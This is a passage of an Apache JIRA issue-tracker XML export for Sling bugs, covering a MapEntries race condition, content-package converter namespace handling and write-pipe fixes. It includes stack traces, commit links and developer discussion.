	at org.apache.jackrabbit.oak.plugins.observation.FilteringDispatcher.contentChanged(FilteringDispatcher.java:52) [org.apache.jackrabbit.oak-core:1.22.11]
	at org.apache.jackrabbit.oak.spi.commit.BackgroundObserver$1$1.call(BackgroundObserver.java:127) [org.apache.jackrabbit.oak-store-spi:1.22.11]
	at org.apache.jackrabbit.oak.spi.commit.BackgroundObserver$1$1.call(BackgroundObserver.java:121) [org.apache.jackrabbit.oak-store-spi:1.22.11]
	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at java.lang.Thread.run(Thread.java:748)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13473715">SLING-11498</key>
            <summary>Race condition in MapEntries: Resource resolver is already closed (Error while dispatching observation events for //*[11111b]@org.apache.sling.jcr.resource.internal.JcrResourceListener</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="Henry Kuijpers">Henry Kuijpers</reporter>
                        <labels>
                    </labels>
                <created>Wed, 27 Jul 2022 08:05:58 +0000</created>
                <updated>Mon, 29 Aug 2022 09:01:51 +0000</updated>
                                            <version>Resource Resolver 1.7.10</version>
                                                    <component>ResourceResolver</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>4</watches>
                                                                                                                <comments>
                            <comment id="17574591" author="rombert" created="Wed, 3 Aug 2022 08:30:14 +0000"  >&lt;p&gt;Thanks for the report &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=Henry+Kuijpers&quot; class=&quot;user-hover&quot; rel=&quot;Henry Kuijpers&quot;&gt;Henry Kuijpers&lt;/a&gt; . Do you have some idea about how to reproduce this?&lt;/p&gt;</comment>
                            <comment id="17584803" author="joerghoh" created="Thu, 25 Aug 2022 12:00:59 +0000"  >&lt;p&gt;There is a race condition between calling &lt;tt&gt;MapEntries.dispose()&lt;/tt&gt; and &lt;tt&gt;MapEntries.updateResource()&lt;/tt&gt; (potentially others) regarding &lt;tt&gt;this.resolver&lt;/tt&gt;. &lt;/p&gt;</comment>
                            <comment id="17597063" author="cziegeler" created="Mon, 29 Aug 2022 09:01:51 +0000"  >&lt;p&gt;The idea behing the &quot;initializing&quot; lock was to handle this situation. All change operations require to get the lock as well as dispose is trying to get it.&lt;br/&gt;
However, it seems not all methods check whether this.resolver is null after they got the lock, part of the code does.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 8 weeks, 3 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z17880:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11497] CPConverter - sling initial content - cnd files in bundles are not respected</title>
                <link>https://issues.apache.org/jira/browse/SLING-11497</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When using the CPConverter with sling initial content, there is a problem when providing a CND file in the bundle itself.&lt;/p&gt;

&lt;p&gt;It&apos;s being ignored, and thus not included into the repoinit statements of the resulting feature model.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Therefore, the namespace / node types are not registered properly.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13473513">SLING-11497</key>
            <summary>CPConverter - sling initial content - cnd files in bundles are not respected</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="Sc0rpic0m">Niek Raaijmakers</assignee>
                                    <reporter username="Sc0rpic0m">Niek Raaijmakers</reporter>
                        <labels>
                    </labels>
                <created>Tue, 26 Jul 2022 09:25:37 +0000</created>
                <updated>Mon, 10 Oct 2022 12:33:02 +0000</updated>
                                            <version>Content-Package to Feature Model Converter 1.1.14</version>
                                                    <component>Content-Package to Feature Model Converter</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                    <issuelinks>
                            <issuelinktype id="10020">
                    <name>Cloners</name>
                                            <outwardlinks description="is a clone of">
                                        <issuelink>
            <issuekey id="13472841">SLING-11488</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 13 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z176z4:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11494] Write pipe should ignore rep:policy</title>
                <link>https://issues.apache.org/jira/browse/SLING-11494</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;rep:policy should not be dubbed by write pipe. If ACLs need to be set in a pipe execution, ACL Pipe can be used&lt;/p&gt;</description>
                <environment></environment>
        <key id="13472947">SLING-11494</key>
            <summary>Write pipe should ignore rep:policy</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="npeltier">Nicolas Peltier</assignee>
                                    <reporter username="npeltier">Nicolas Peltier</reporter>
                        <labels>
                    </labels>
                <created>Fri, 22 Jul 2022 16:38:34 +0000</created>
                <updated>Sun, 21 Aug 2022 20:29:13 +0000</updated>
                            <resolved>Fri, 22 Jul 2022 16:39:49 +0000</resolved>
                                    <version>pipes 4.4.2</version>
                                    <fixVersion>pipes 4.5.0</fixVersion>
                                    <component>pipes</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17570115" author="npeltier" created="Fri, 22 Jul 2022 16:39:49 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-pipes/commit/b275559c736513bb26c59f849a0cc83f7483b64d&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-pipes/commit/b275559c736513bb26c59f849a0cc83f7483b64d&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17582633" author="npeltier" created="Sun, 21 Aug 2022 20:29:13 +0000"  >&lt;p&gt;released with 4.5.0&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 9 weeks, 3 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z173hk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11493] Write pipe should ignore lock properties</title>
                <link>https://issues.apache.org/jira/browse/SLING-11493</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;&lt;font color=&quot;#172b4d&quot;&gt;&quot;jcr:lockIsDeep&quot; and &quot;jcr:lockOwner&quot; should be ignored from dubbing&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13472940">SLING-11493</key>
            <summary>Write pipe should ignore lock properties</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="npeltier">Nicolas Peltier</assignee>
                                    <reporter username="npeltier">Nicolas Peltier</reporter>
                        <labels>
                    </labels>
                <created>Fri, 22 Jul 2022 16:14:33 +0000</created>
                <updated>Sun, 21 Aug 2022 20:29:13 +0000</updated>
                            <resolved>Fri, 22 Jul 2022 16:16:04 +0000</resolved>
                                    <version>pipes 4.4.2</version>
                                    <fixVersion>pipes 4.5.0</fixVersion>
                                    <component>pipes</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17570105" author="npeltier" created="Fri, 22 Jul 2022 16:16:04 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-pipes/commit/6c160c16ad220dbe6168027625bc3dd7191e4b51&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-pipes/commit/6c160c16ad220dbe6168027625bc3dd7191e4b51&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17582630" author="npeltier" created="Sun, 21 Aug 2022 20:29:13 +0000"  >&lt;p&gt;released with 4.5.0&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 9 weeks, 3 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z173g0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11492] write pipe should not try to mark nodes that can&apos;t be written with jcr:lastModified</title>
                <link>https://issues.apache.org/jira/browse/SLING-11492</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;there are JCR nodes that can&apos;t be marked with jcr:lastModified, those should not be touched at all.&lt;/p&gt;

&lt;p&gt;jcr:lastModified can&apos;t be put into node: java.util.GregorianCalendar[time=1658502310596,areFieldsSet=true,areAllFieldsSet=true,lenient=true,zone=sun.util at&lt;br/&gt;
org.apache.sling.jcr.resource.internal.JcrModifiableValueMap.put(JcrModifiableValueMap.java:47) &lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.jcr.resource:3.0.18&amp;#93;&lt;/span&gt;&lt;br/&gt;
.calendar.ZoneInfo[id=&quot;Europe/Paris&quot;,offset=3600000,dstSavings=3600000,useDaylight=true,transitions=184,lastRule=java.util.SimpleTimeZone[id=Europe/Paris,offset=3600000,dstSavings=3600000,useDaylight=tr&amp;gt;&lt;br/&gt;
at org.apache.sling.pipes.internal.PlumberImpl.markWithJcrLastModified(PlumberImpl.java:300) &lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.pipes:4.5.0.SNAPSHOT&amp;#93;&lt;/span&gt;&lt;br/&gt;
e,startYear=0,startMode=2,startMonth=2,startDay=-1,startDayOfWeek=1,startTime=3600000,startTimeMode=2,endMode=2,endMonth=9,endDay=-1,endDayOfWeek=1,endTime=3600000,endTimeMode=2]],firstDayOfWeek=2,minim&amp;gt;&lt;br/&gt;
at org.apache.sling.pipes.internal.PathPipe.computeOutput(PathPipe.java:93) &lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.pipes:4.5.0.SNAPSHOT&amp;#93;&lt;/span&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13472928">SLING-11492</key>
            <summary>write pipe should not try to mark nodes that can&apos;t be written with jcr:lastModified</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="npeltier">Nicolas Peltier</assignee>
                                    <reporter username="npeltier">Nicolas Peltier</reporter>
                        <labels>
                    </labels>
                <created>Fri, 22 Jul 2022 15:10:03 +0000</created>
                <updated>Sun, 21 Aug 2022 20:29:13 +0000</updated>
                            <resolved>Fri, 22 Jul 2022 15:30:54 +0000</resolved>
                                    <version>pipes 4.4.2</version>
                                    <fixVersion>pipes 4.5.0</fixVersion>
                                    <component>pipes</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17570083" author="npeltier" created="Fri, 22 Jul 2022 15:30:54 +0000"  >&lt;p&gt;fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-pipes/commit/a95cf1172c9f578a5a5ca9394528640641916033&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-pipes/commit/a95cf1172c9f578a5a5ca9394528640641916033&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17582627" author="npeltier" created="Sun, 21 Aug 2022 20:29:13 +0000"  >&lt;p&gt;released with 4.5.0&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 9 weeks, 3 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z173dc:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11488]  CPConverter - use extension &quot;extracted-repo-namespaces&quot; </title>
                <link>https://issues.apache.org/jira/browse/SLING-11488</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;We at Adobe are introducing a new extension &quot;extracted-repo-namespaces&quot; in the aem SDK feature model.&lt;/p&gt;

&lt;p&gt;In here we put &quot;register namespace repoinit statements&quot; of the repository, so we can use the namespaces without issues.&lt;/p&gt;

&lt;p&gt;We need to use a separate extension with just the register namespace statements, instead of all the repoinit statements of the SDK, because then the aemanalyser will analyse a huge repoinit statement that is irrelevant for the end-users.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;But we do need the namespaces for sling initial content to work in the CPConverter.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13472841">SLING-11488</key>
            <summary> CPConverter - use extension &quot;extracted-repo-namespaces&quot; </summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="10011">Won&apos;t Do</resolution>
                                        <assignee username="Sc0rpic0m">Niek Raaijmakers</assignee>
                                    <reporter username="Sc0rpic0m">Niek Raaijmakers</reporter>
                        <labels>
                    </labels>
                <created>Fri, 22 Jul 2022 07:22:14 +0000</created>
                <updated>Tue, 26 Jul 2022 09:48:42 +0000</updated>
                            <resolved>Tue, 26 Jul 2022 09:25:05 +0000</resolved>
                                    <version>Content-Package to Feature Model Converter 1.1.14</version>
                                                    <component>Content-Package to Feature Model Converter</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                                                                                <comments>
                            <comment id="17569846" author="kwin" created="Fri, 22 Jul 2022 07:26:41 +0000"  >&lt;p&gt;Who is &quot;we&quot; and where is this extension introduced?&lt;/p&gt;</comment>
                            <comment id="17569918" author="sc0rpic0m" created="Fri, 22 Jul 2022 10:03:53 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt;&#160; I updated the ticket with more details. I hope this is sufficient. I know it would be more pretty to hold it within 1 extension, but this was much easier to accomplish.&lt;/p&gt;</comment>
                            <comment id="17569925" author="kwin" created="Fri, 22 Jul 2022 10:10:24 +0000"  >&lt;p&gt;I don&#8217;t think Sling should know about derivative work and as long as the extension is not used in Sling I am pretty much against this.&lt;/p&gt;</comment>
                            <comment id="17569931" author="sc0rpic0m" created="Fri, 22 Jul 2022 10:19:09 +0000"  >&lt;p&gt;Fair point. &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=davidb&quot; class=&quot;user-hover&quot; rel=&quot;davidb&quot;&gt;davidb&lt;/a&gt; &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kpauls&quot; class=&quot;user-hover&quot; rel=&quot;kpauls&quot;&gt;kpauls&lt;/a&gt;&#160; once back from PTO we&apos;ll have to talk about this. I guess it looks like I&apos;ll have to figure out a way to compress it in the existing extension.&lt;/p&gt;</comment>
                            <comment id="17569992" author="dsuess" created="Fri, 22 Jul 2022 12:32:05 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; the challenge at hand is not specific to Adobe. The requirement here is to be able to convert a package and bundles into something that can be layered on top of a base that has a lifecycle independent from the application at hand. Therefore the output of conversion should depend on some kind of uber API (in the case of AEM this is sdk jar) which contains the stable contract that can be analyzed against. As detected in the past the full repoinit such a layer would use is containing too many moving bits that are unnecessary and distracting to analyze so this is being stripped out - now repoinit does register namespaces which are necessary to run the conversion from sling-initial-content into content packages. &lt;br/&gt;
This ticket aims to make sure only the information necessary for the transformation can be provided while omitting repoinit that is supposed to be integrated and analyzed at a later time (deploy time).&lt;/p&gt;</comment>
                            <comment id="17569995" author="kwin" created="Fri, 22 Jul 2022 12:36:49 +0000"  >&lt;p&gt;I am not questioning the use case. I am questioning the approach that an extension which is Adobe-specific is explicitly mentioned in the attached PR (&quot;extracted-repo-namespaces&quot;). As long as that extension is not part of Sling this is IMHO unwanted mingling.&lt;/p&gt;</comment>
                            <comment id="17570002" author="dsuess" created="Fri, 22 Jul 2022 12:59:20 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=Sc0rpic0m&quot; class=&quot;user-hover&quot; rel=&quot;Sc0rpic0m&quot;&gt;Sc0rpic0m&lt;/a&gt;, &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; here a suggestion - we could make this also be repoinit yet being named differently - the configuration option would be about redirecting which extension to use to consume repoinit - that way we can split up the repoinit blocks into the scopes necessary and the converter can chose which (0, 1, n named ones) extension to consume during the conversion - this way we can easily add just the one necessary for the sdk jar (build time) and keep the full repoinit for deploy time.&lt;/p&gt;</comment>
                            <comment id="17570011" author="sc0rpic0m" created="Fri, 22 Jul 2022 13:16:56 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt;&#160; I have to side with Konrad here from a sling perspective. Sling should be decoupled from AEM.&#160;&lt;/p&gt;

&lt;p&gt;I guess we can make it so that the repoinit extension will just contain the namespaces instead of removing it completely as we do now at Adobe?&lt;/p&gt;</comment>
